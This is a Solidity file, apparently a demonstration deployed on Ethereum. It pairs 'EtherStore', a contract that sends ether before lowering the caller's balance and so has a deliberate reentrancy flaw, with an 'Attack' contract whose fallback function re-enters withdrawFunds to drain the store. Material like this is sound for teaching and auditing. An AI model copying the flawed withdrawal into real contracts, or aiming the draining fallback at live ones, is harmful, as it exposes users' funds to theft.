/**
 *Submitted for verification at Etherscan.io on 2022-03-22
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public returns (bool success) {
        require(balances[msg.sender] >= _weiToWithdraw);
        ( success, ) = msg.sender.call{value: _weiToWithdraw}("");
        balances[msg.sender] = balances[msg.sender] - _weiToWithdraw;
        return success;
    }
    
    function getBalance_1 () public returns (uint256){
      return address(this).balance;
    }
}

contract Attack {
  EtherStore public etherStore;
  uint256 public withdrawAmount;

  // initialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      // send eth to the depositFunds() function
      etherStore.depositFunds{value:1 ether}();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function pwnEtherStore_1() public payable{
      etherStore.depositFunds{value:1 ether}();
  }

    function pwnEtherStore_2() public payable {
      etherStore.withdrawFunds(1000000000000000000);
  }

  function getBalance() public returns (uint256){
      return etherStore.balances(address(this));
  }



  function getBalance_1 () public returns (uint256){
      return address(this).balance;
  }



  // fallback function - where the magic happens
  fallback() payable external {
    if (address(etherStore).balance > 1 ether) {
      etherStore.withdrawFunds(1 ether);
      withdrawAmount = withdrawAmount + 1;
    }
  }
}